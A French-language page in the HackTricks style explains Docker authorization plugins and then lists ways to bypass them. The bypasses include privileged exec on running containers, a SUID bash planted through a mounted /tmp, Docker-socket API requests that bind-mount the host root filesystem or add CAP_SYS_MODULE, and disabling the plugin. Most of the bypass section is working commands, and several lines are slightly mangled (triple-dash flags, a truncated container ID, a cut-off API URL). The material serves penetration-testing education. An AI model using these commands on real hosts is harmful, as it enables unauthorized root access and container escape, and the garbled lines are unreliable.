{{#include ../../../banners/hacktricks-training.md}}

Le modèle **d'autorisation** de **Docker** est **tout ou rien**. Tout utilisateur ayant la permission d'accéder au démon Docker peut **exécuter n'importe quelle** commande du client Docker. Il en va de même pour les appelants utilisant l'API Engine de Docker pour contacter le démon. Si vous avez besoin d'un **contrôle d'accès** plus **granulaire**, vous pouvez créer des **plugins d'autorisation** et les ajouter à la configuration de votre démon Docker. En utilisant un plugin d'autorisation, un administrateur Docker peut **configurer des politiques d'accès** détaillées pour gérer l'accès au démon Docker.

# Architecture de base

Les plugins d'authentification Docker sont des **plugins externes** que vous pouvez utiliser pour **autoriser/refuser** les **actions** demandées au démon Docker **en fonction** de l'**utilisateur** qui les a demandées et de l'**action** **demandée**.

**[Les informations suivantes proviennent de la documentation](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Lorsqu'une **demande HTTP** est faite au **démon** Docker via la CLI ou via l'API Engine, le **sous-système d'authentification** **transmet** la demande aux **plugins d'authentification** installés. La demande contient l'utilisateur (appelant) et le contexte de la commande. Le **plugin** est responsable de décider s'il faut **autoriser** ou **refuser** la demande.

Les diagrammes de séquence ci-dessous illustrent un flux d'autorisation d'autorisation et de refus :

![Flux d'autorisation autorisé](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Flux d'autorisation refusé](https://docs.docker.com/engine/extend/images/authz_deny.png)

Chaque demande envoyée au plugin **inclut l'utilisateur authentifié, les en-têtes HTTP et le corps de la demande/réponse**. Seuls le **nom d'utilisateur** et la **méthode d'authentification** utilisée sont transmis au plugin. Plus important encore, **aucune** **information d'identification** ou jetons d'utilisateur ne sont transmis. Enfin, **tous les corps de demande/réponse ne sont pas envoyés** au plugin d'autorisation. Seuls les corps de demande/réponse où le `Content-Type` est soit `text/*` soit `application/json` sont envoyés.

Pour les commandes qui peuvent potentiellement détourner la connexion HTTP (`HTTP Upgrade`), comme `exec`, le plugin d'autorisation n'est appelé que pour les demandes HTTP initiales. Une fois que le plugin approuve la commande, l'autorisation n'est pas appliquée au reste du flux. En particulier, les données de streaming ne sont pas transmises aux plugins d'autorisation. Pour les commandes qui renvoient une réponse HTTP en morceaux, comme `logs` et `events`, seule la demande HTTP est envoyée aux plugins d'autorisation.

Lors du traitement des demandes/réponses, certains flux d'autorisation peuvent nécessiter des requêtes supplémentaires au démon Docker. Pour compléter de tels flux, les plugins peuvent appeler l'API du démon comme un utilisateur ordinaire. Pour permettre ces requêtes supplémentaires, le plugin doit fournir les moyens à un administrateur de configurer des politiques d'authentification et de sécurité appropriées.

## Plusieurs Plugins

Vous êtes responsable de **l'enregistrement** de votre **plugin** dans le cadre du **démarrage** du démon Docker. Vous pouvez installer **plusieurs plugins et les enchaîner**. Cette chaîne peut être ordonnée. Chaque demande au démon passe dans l'ordre à travers la chaîne. Ce n'est que lorsque **tous les plugins accordent l'accès** à la ressource que l'accès est accordé.

# Exemples de Plugins

## Twistlock AuthZ Broker

Le plugin [**authz**](https://github.com/twistlock/authz) vous permet de créer un simple fichier **JSON** que le **plugin** lira pour autoriser les demandes. Par conséquent, il vous donne l'opportunité de contrôler très facilement quels points de terminaison API peuvent atteindre chaque utilisateur.

Voici un exemple qui permettra à Alice et Bob de créer de nouveaux conteneurs : `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Dans la page [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go), vous pouvez trouver la relation entre l'URL demandée et l'action. Dans la page [types.go](https://github.com/twistlock/authz/blob/master/core/types.go), vous pouvez trouver la relation entre le nom de l'action et l'action.

## Tutoriel de Plugin Simple

Vous pouvez trouver un **plugin facile à comprendre** avec des informations détaillées sur l'installation et le débogage ici : [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lisez le `README` et le code `plugin.go` pour comprendre comment cela fonctionne.

# Contournement du Plugin d'Auth Docker

## Énumérer l'accès

Les principales choses à vérifier sont **quels points de terminaison sont autorisés** et **quelles valeurs de HostConfig sont autorisées**.

Pour effectuer cette énumération, vous pouvez **utiliser l'outil** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## `run --privileged` non autorisé

### Privilèges minimaux
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Exécution d'un conteneur puis obtention d'une session privilégiée

Dans ce cas, l'administrateur système **a interdit aux utilisateurs de monter des volumes et d'exécuter des conteneurs avec le `--privileged` flag** ou de donner des capacités supplémentaires au conteneur :
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Cependant, un utilisateur peut **créer un shell à l'intérieur du conteneur en cours d'exécution et lui donner des privilèges supplémentaires** :
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Maintenant, l'utilisateur peut s'échapper du conteneur en utilisant l'une des [**techniques discutées précédemment**](./#privileged-flag) et **escalader les privilèges** à l'intérieur de l'hôte.

## Monter un Dossier Écrivable

Dans ce cas, l'administrateur système **a interdit aux utilisateurs d'exécuter des conteneurs avec le drapeau `--privileged`** ou de donner des capacités supplémentaires au conteneur, et il a seulement autorisé à monter le dossier `/tmp` :
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Notez que vous ne pouvez peut-être pas monter le dossier `/tmp`, mais vous pouvez monter un **dossier écrivable différent**. Vous pouvez trouver des répertoires écrivables en utilisant : `find / -writable -type d 2>/dev/null`
>
> **Notez que tous les répertoires d'une machine linux ne prendront pas en charge le bit suid !** Pour vérifier quels répertoires prennent en charge le bit suid, exécutez `mount | grep -v "nosuid"` Par exemple, généralement `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` et `/var/lib/lxcfs` ne prennent pas en charge le bit suid.
>
> Notez également que si vous pouvez **monter `/etc`** ou tout autre dossier **contenant des fichiers de configuration**, vous pouvez les modifier depuis le conteneur docker en tant que root afin de **les exploiter sur l'hôte** et d'escalader les privilèges (peut-être en modifiant `/etc/shadow`)

## Point de terminaison API non vérifié

La responsabilité de l'administrateur système configurant ce plugin serait de contrôler quelles actions et avec quels privilèges chaque utilisateur peut effectuer. Par conséquent, si l'administrateur adopte une approche de **liste noire** avec les points de terminaison et les attributs, il pourrait **oublier certains d'entre eux** qui pourraient permettre à un attaquant d'**escalader les privilèges.**

Vous pouvez consulter l'API docker à [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Structure JSON non vérifiée

### Binds en root

Il est possible que lorsque l'administrateur système a configuré le pare-feu docker, il **ait oublié certains paramètres importants** de l'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) comme "**Binds**".\
Dans l'exemple suivant, il est possible d'exploiter cette mauvaise configuration pour créer et exécuter un conteneur qui monte le dossier racine (/) de l'hôte :
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Notez comment dans cet exemple nous utilisons le paramètre **`Binds`** comme une clé de niveau racine dans le JSON mais dans l'API, il apparaît sous la clé **`HostConfig`**

### Binds dans HostConfig

Suivez la même instruction qu'avec **Binds dans la racine** en effectuant cette **demande** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montages dans la racine

Suivez les mêmes instructions que pour **Liens dans la racine** en effectuant cette **demande** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts dans HostConfig

Suivez les mêmes instructions qu'avec **Binds dans root** en effectuant cette **demande** à l'API Docker :
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Attribut JSON non vérifié

Il est possible que lorsque l'administrateur système a configuré le pare-feu docker, il **ait oublié un attribut important d'un paramètre** de l'[**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) comme "**Capabilities**" à l'intérieur de "**HostConfig**". Dans l'exemple suivant, il est possible d'abuser de cette mauvaise configuration pour créer et exécuter un conteneur avec la capacité **SYS_MODULE** :
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> Le **`HostConfig`** est la clé qui contient généralement les **privileges** **intéressants** pour s'échapper du conteneur. Cependant, comme nous l'avons discuté précédemment, notez que l'utilisation de Binds en dehors de celui-ci fonctionne également et peut vous permettre de contourner les restrictions.

## Désactivation du Plugin

Si le **sysadmin** a **oublié** de **interdire** la possibilité de **désactiver** le **plugin**, vous pouvez en profiter pour le désactiver complètement !
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
N'oubliez pas de **réactiver le plugin après l'escalade**, sinon un **redémarrage du service docker ne fonctionnera pas** !

## Rapports de contournement du plugin d'authentification

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
